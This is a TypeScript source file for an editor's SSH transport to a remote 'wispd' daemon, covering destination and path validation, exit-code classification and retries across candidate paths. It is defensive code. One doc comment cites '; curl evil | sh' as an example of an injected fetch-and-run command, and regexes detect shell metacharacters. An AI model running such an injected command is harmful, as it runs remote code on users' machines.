/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import * as cp from 'child_process';
import { homedir } from 'os';
import { Emitter, Event } from '../../../base/common/event.js';
import { Disposable, DisposableStore } from '../../../base/common/lifecycle.js';
import { sanitizeProcessEnvironment } from '../../../base/common/processes.js';
import { ILogger } from '../../log/common/log.js';
import { IWispdTransport, IWispdTransportClose, IWispdTransportFactory } from '../common/wispdClient.js';
import { ATTACH_EXIT_UNREACHABLE, IWispdProcessStreams, WispdCloseClassifier, WispdProcessTransport } from './wispdTransport.js';

/** ssh's own exit code for a connection-level failure: no route, a timeout, auth, or a host key (`ssh(1)`). */
export const SSH_CONNECTION_FAILURE_EXIT_CODE = 255;

/** The remote shell's exit code when the command it was asked to run isn't on its `PATH`. */
export const REMOTE_COMMAND_NOT_FOUND_EXIT_CODE = 127;

/** ssh isn't found on the editor's own `PATH`, so it never ran at all. */
const SSH_NOT_FOUND_HINT = 'Install ssh, or make sure it is on PATH.';

/**
 * `wispd` on a host's `PATH`, then the paths Homebrew uses on Apple silicon and on Intel
 * (decision record 0007; see daemon/README.md for why a non-interactive SSH `PATH` misses these).
 */
export const DEFAULT_REMOTE_WISPD_CANDIDATES: readonly string[] = ['wispd', '/opt/homebrew/bin/wispd', '/usr/local/bin/wispd'];

/** Every C0 and C1 control character, plus Unicode format characters such as zero-width space and RTL override. */
const CONTROL_OR_FORMAT_CHARACTER = /[\p{Cc}\p{Cf}]/u;
/** Shell metacharacters. ssh runs argv with no shell of its own, but the destination still ends up in one on the host (0007) or, for a user@-host form, can be misread by ssh itself. */
const SHELL_METACHARACTER = /[`$;&|<>(){}'"\\]/;
/** A `-` right where ssh would start reading a hostname: at the start, right after `@`, or right after a `scheme://`. */
const LEADING_DASH = /(^|@|:\/\/)-/;

/**
 * Rejects an ssh destination that ssh could misread as an option, that could carry stray or
 * invisible bytes into the argument vector, or that could inject a second shell command once the
 * host's login shell runs it (0007's `-- <destination>` stops ssh from reading it as an option,
 * but not the host's shell from interpreting what's inside it). Returns why it's invalid, or
 * `undefined` if it's fine to use.
 */
export function validateSshDestination(destination: string): string | undefined {
	if (destination.length === 0) {
		return 'it is empty';
	}
	if (LEADING_DASH.test(destination)) {
		return 'it starts with "-" (or a user or scheme part does), which ssh would read as an option';
	}
	if (/\s/.test(destination)) {
		return 'it contains whitespace';
	}
	if (CONTROL_OR_FORMAT_CHARACTER.test(destination)) {
		return 'it contains a control or invisible formatting character';
	}
	if (SHELL_METACHARACTER.test(destination)) {
		return 'it contains a shell metacharacter';
	}
	return undefined;
}

/** An absolute path of plain characters: no shell metacharacters, quoting, or expansion for a host's login shell to act on. */
const REMOTE_WISPD_PATH_PATTERN = /^\/[A-Za-z0-9._+/-]+$/;

/**
 * Rejects a `wisp.remoteWispdPath` that isn't a plain absolute path. ssh joins the remote command
 * with spaces and hands it to the host's login shell (0007), so anything else in this setting,
 * such as `; curl evil | sh` or `$(...)`, would run there. Returns why it's invalid, or
 * `undefined` if it's fine to use.
 */
export function validateRemoteWispdPath(path: string): string | undefined {
	if (!REMOTE_WISPD_PATH_PATTERN.test(path)) {
		return 'it must be an absolute path made only of letters, digits, and . _ + - /';
	}
	return undefined;
}

/** The exact argument vector from decision record 0007, run with no shell. */
export function buildSshArgs(destination: string, remoteWispd: string): string[] {
	return ['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', destination, remoteWispd, 'attach'];
}

/**
 * Builds the classifier that maps one ssh attempt's exit code and stderr to a close reason
 * (decision record 0007). Exit 4 still means `wispd attach` ran on the host and could not reach or
 * start wispd there. Exit 127 means the remote shell never found the command. Exit 255 is ssh's own
 * catch-all for a connection that never got to run anything, which stderr is the only way to tell
 * apart — but only for the attempt that never got anywhere: once a line has come back, an auth or
 * host-key phrase left over in the stderr tail from earlier in the session doesn't apply anymore,
 * so a later 255 is treated as a dropped connection instead.
 */
export function makeSshClassifier(destination: string): WispdCloseClassifier {
	return (exitCode, signal, stderrTail, receivedLine) => {
		if (exitCode === ATTACH_EXIT_UNREACHABLE) {
			return { reason: 'unreachable', message: `wispd attach could not reach or start wispd on ${destination}.`, exitCode };
		}
		if (exitCode === REMOTE_COMMAND_NOT_FOUND_EXIT_CODE) {
			return {
				reason: 'wispdNotFound',
				message: `${destination}'s shell could not find wispd. Install it there with Homebrew, add it to PATH in ~/.zshenv, or set wisp.remoteWispdPath to its absolute path.`,
				exitCode,
			};
		}
		if (exitCode === SSH_CONNECTION_FAILURE_EXIT_CODE) {
			return classifySshConnectionFailure(stderrTail, exitCode, destination, receivedLine);
		}
		return {
			reason: 'exited',
			message: `ssh exited${signal ? ` on ${signal}` : ` with code ${exitCode}`}.`,
			exitCode,
		};
	};
}

function classifySshConnectionFailure(stderrTail: string, exitCode: number, destination: string, receivedLine: boolean): Omit<IWispdTransportClose, 'stderr'> {
	const text = stderrTail.toLowerCase();
	// Auth and host-key prompts only ever happen before anything has come back from the host; a
	// 255 after that is a dropped connection, whatever unrelated text is still in the stderr tail.
	if (!receivedLine) {
		if (text.includes('permission denied') || text.includes('authentication failed') || text.includes('too many authentication failures')) {
			return {
				reason: 'authFailed',
				message: `ssh could not authenticate to ${destination}. BatchMode turns any prompt into this error, including one for interactive two-factor login, which is not supported. Run "ssh ${destination}" in the integrated terminal to unlock your key.`,
				exitCode,
			};
		}
		// Checked before the more general "verification failed" text below, since ssh's changed-key
		// warning ends with that same phrase.
		if (text.includes('remote host identification has changed')) {
			return {
				reason: 'hostKeyChanged',
				message: `ssh's saved key for ${destination} does not match what the host presented now, which can mean a possible attack. Verify the new key out of band, then update known_hosts yourself; wisp will not do it for you.`,
				exitCode,
			};
		}
		if (text.includes('host key verification failed')) {
			return {
				reason: 'hostKeyUnknown',
				message: `ssh doesn't recognize ${destination}'s key yet, and BatchMode can't prompt to accept it. Run "ssh ${destination}" in the integrated terminal to accept it.`,
				exitCode,
			};
		}
	}
	if (text.includes('could not resolve hostname') || text.includes('name or service not known') || text.includes('no route to host')
		|| text.includes('network is unreachable') || text.includes('connection refused') || text.includes('operation timed out') || text.includes('connection timed out')) {
		return { reason: 'noRoute', message: `ssh could not reach ${destination}: no route, or the attempt timed out.`, exitCode };
	}
	return { reason: 'exited', message: `ssh exited with code ${exitCode}.`, exitCode };
}

/** Whether `line` parses as a JSON-RPC-shaped message: a JSON object, not a shell's banner text. */
function isJsonRpcShaped(line: string): boolean {
	try {
		const value: unknown = JSON.parse(line);
		return typeof value === 'object' && value !== null;
	} catch {
		return false;
	}
}

/**
 * A transport that spawns ssh to reach `wispd attach` on a host (decision record 0007). It tries
 * `candidates` for the remote `wispd` in order, respawning with the next one whenever the shell
 * answers 127 (command not found), so the reconnect state machine in `WispdClient` still sees one
 * connection attempt per candidate list, not one per candidate. It stops doing that the moment a
 * candidate answers with anything JSON-RPC shaped: from then on it behaves like a plain transport,
 * an exit 127 included, so `WispdClient`'s own reconnect handles whatever comes after a working
 * connection.
 */
export class WispdSshTransport extends Disposable implements IWispdTransport {

	private readonly _onDidReceiveLine = this._register(new Emitter<string>());
	readonly onDidReceiveLine = this._onDidReceiveLine.event;

	private readonly _onDidReceiveData = this._register(new Emitter<void>());
	readonly onDidReceiveData = this._onDidReceiveData.event;

	private readonly _onDidClose = this._register(new Emitter<IWispdTransportClose>());
	readonly onDidClose = this._onDidClose.event;

	private readonly current = this._register(new DisposableStore());
	private transport: WispdProcessTransport | undefined;
	private index = 0;
	private done = false;
	/**
	 * True once a candidate has answered with a JSON-RPC-shaped line. Before that, a `wispdNotFound`
	 * close respawns the next candidate instead of closing, and `send` buffers lines so they can be
	 * replayed: a candidate that turned out to be missing never read its stdin, so whatever
	 * `WispdClient` sent it — `initialize`, up front and only once — needs to reach the next one
	 * instead. After that, none of this applies: retries would silently swap out a live connection
	 * from under `WispdClient`, and buffering forever would hold onto every message for the
	 * connection's whole life, `context/write` payloads included.
	 */
	private settled = false;
	private readonly sent: string[] = [];

	constructor(
		private readonly destination: string,
		private readonly candidates: readonly string[],
		private readonly spawn: (args: readonly string[]) => cp.ChildProcess & IWispdProcessStreams,
		private readonly command: string,
		private readonly logger: ILogger,
		private readonly maxFrameBytes: number | undefined,
		private readonly classifyExit: WispdCloseClassifier,
	) {
		super();
		this.spawnNext();
	}

	/** The current attempt's process id, for tests that stop it from outside. */
	get pid(): number | undefined {
		return this.transport?.pid;
	}

	send(line: string): void {
		if (!this.settled) {
			this.sent.push(line);
		}
		this.transport?.send(line);
	}

	private spawnNext(): void {
		this.current.clear();
		const remoteWispd = this.candidates[this.index];
		const child = this.spawn(buildSshArgs(this.destination, remoteWispd));
		const transport = this.current.add(new WispdProcessTransport(child, this.command, this.logger, this.maxFrameBytes, this.classifyExit, SSH_NOT_FOUND_HINT));
		this.transport = transport;
		this.current.add(transport.onDidReceiveData(() => this._onDidReceiveData.fire()));
		this.current.add(transport.onDidReceiveLine(line => {
			if (!this.settled && isJsonRpcShaped(line)) {
				this.settled = true;
				this.sent.length = 0;
			}
			this._onDidReceiveLine.fire(line);
		}));
		this.current.add(transport.onDidClose(close => this.onTransportClose(close)));
		for (const line of this.sent) {
			transport.send(line);
		}
	}

	private onTransportClose(close: IWispdTransportClose): void {
		if (this.done || this._store.isDisposed) {
			return;
		}
		if (!this.settled && close.reason === 'wispdNotFound' && this.index + 1 < this.candidates.length) {
			this.index++;
			this.spawnNext();
			return;
		}
		this.done = true;
		this._onDidClose.fire(close);
	}
}

export interface IWispdSshLaunch {
	readonly destination: string;
	/** Tried in order; the first that doesn't answer 127 wins. */
	readonly remoteWispdCandidates: readonly string[];
	/** Defaults to `ssh` on `PATH`. */
	readonly sshExecutable?: string;
	readonly env?: NodeJS.ProcessEnv;
	readonly cwd?: string;
	readonly maxFrameBytes?: number;
}

export class WispdSshTransportFactory implements IWispdTransportFactory {

	readonly command: string;

	constructor(private readonly launch: IWispdSshLaunch, private readonly logger: ILogger) {
		const firstCandidate = launch.remoteWispdCandidates[0] ?? 'wispd';
		this.command = `${launch.sshExecutable ?? 'ssh'} -T -o BatchMode=yes -o ConnectTimeout=10 -o ControlPath=none -- ${launch.destination} ${firstCandidate} attach`;
	}

	create(): IWispdTransport {
		const sshExecutable = this.launch.sshExecutable ?? 'ssh';
		const spawn = (args: readonly string[]) => {
			// A serve that attach starts on the host outlives this ssh session, so it should not
			// inherit the editor's own VSCODE_* and ELECTRON_* variables (decision record 0010).
			const env = { ...(this.launch.env ?? process.env) };
			sanitizeProcessEnvironment(env);
			return cp.spawn(sshExecutable, [...args], {
				stdio: ['pipe', 'pipe', 'pipe'],
				env,
				cwd: this.launch.cwd ?? homedir(),
			}) as cp.ChildProcess & IWispdProcessStreams;
		};
		return new WispdSshTransport(this.launch.destination, this.launch.remoteWispdCandidates, spawn, this.command, this.logger, this.launch.maxFrameBytes, makeSshClassifier(this.launch.destination));
	}
}

/** A transport that closes on its own, for a `wisp.host` or `wisp.remoteWispdPath` that isn't usable (decision record 0007). */
export class WispdInvalidHostTransportFactory implements IWispdTransportFactory {

	constructor(readonly command: string, private readonly message: string) { }

	create(): IWispdTransport {
		return new ImmediateCloseTransport({ reason: 'invalidHost', message: this.message });
	}
}

class ImmediateCloseTransport extends Disposable implements IWispdTransport {
	readonly onDidReceiveLine = Event.None;
	readonly onDidReceiveData = Event.None;

	private readonly _onDidClose = this._register(new Emitter<IWispdTransportClose>());
	readonly onDidClose = this._onDidClose.event;

	constructor(close: IWispdTransportClose) {
		super();
		// Fires after `create()` returns, once the caller has had a chance to listen.
		queueMicrotask(() => {
			if (!this._store.isDisposed) {
				this._onDidClose.fire(close);
			}
		});
	}

	send(): void {
		// Nothing to send: the connection never opens.
	}
}
